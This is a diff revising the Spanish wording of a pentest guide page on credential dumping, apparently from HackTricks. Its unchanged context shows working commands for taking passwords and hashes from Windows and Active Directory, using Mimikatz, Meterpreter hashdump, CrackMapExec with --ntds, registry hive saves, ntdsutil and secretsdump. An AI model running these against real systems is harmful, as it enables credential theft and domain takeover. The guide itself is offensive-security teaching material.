@@ -41,7 +41,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Credenciales con Meterpreter
 
-Utiliza el [**Complemento de Credenciales**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.
+Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -146,7 +146,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Volcar el historial de contraseñas NTDS.dit del DC objetivo
+### Volcar el historial de contraseñas de NTDS.dit desde el DC objetivo
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -171,7 +171,7 @@ reg save HKLM\security security
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Volume Shadow Copy
+### Copia de Sombra de Volumen
 
 Puedes realizar copias de archivos protegidos utilizando este servicio. Necesitas ser Administrador.
 
@@ -212,7 +212,7 @@ El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, co
 Dentro de esta base de datos, se mantienen tres tablas principales:
 
 - **Tabla de Datos**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
-- **Tabla de Enlaces**: Lleva un registro de las relaciones, como las membresías de grupos.
+- **Tabla de Enlaces**: Realiza un seguimiento de las relaciones, como las membresías de grupos.
 - **Tabla SD**: Aquí se mantienen los **descriptores de seguridad** para cada objeto, asegurando la seguridad y el control de acceso para los objetos almacenados.
 
 Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
@@ -227,7 +227,7 @@ El hash está cifrado 3 veces:
 2. Desencriptar el **hash** usando **PEK** y **RC4**.
 3. Desencriptar el **hash** usando **DES**.
 
-**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esto, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esta razón, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Copiando NTDS.dit usando Ntdsutil
 
@@ -235,7 +235,7 @@ Disponible desde Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Podrías también usar el truco de [**copia de sombra de volumen**](./#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**dumps desde el registro o usa el truco de copia de sombra de volumen**](./#stealing-sam-and-system)).
+Podrías también usar el truco de [**copia de sombra de volumen**](./#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**sácalo del registro o usa el truco de copia de sombra de volumen**](./#stealing-sam-and-system)).
 
 ### **Extrayendo hashes de NTDS.dit**
 
@@ -243,7 +243,7 @@ Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes us
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-También puedes **extraerlos automáticamente** utilizando un usuario administrador de dominio válido:
+También puedes **extraerlos automáticamente** utilizando un usuario de administrador de dominio válido:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
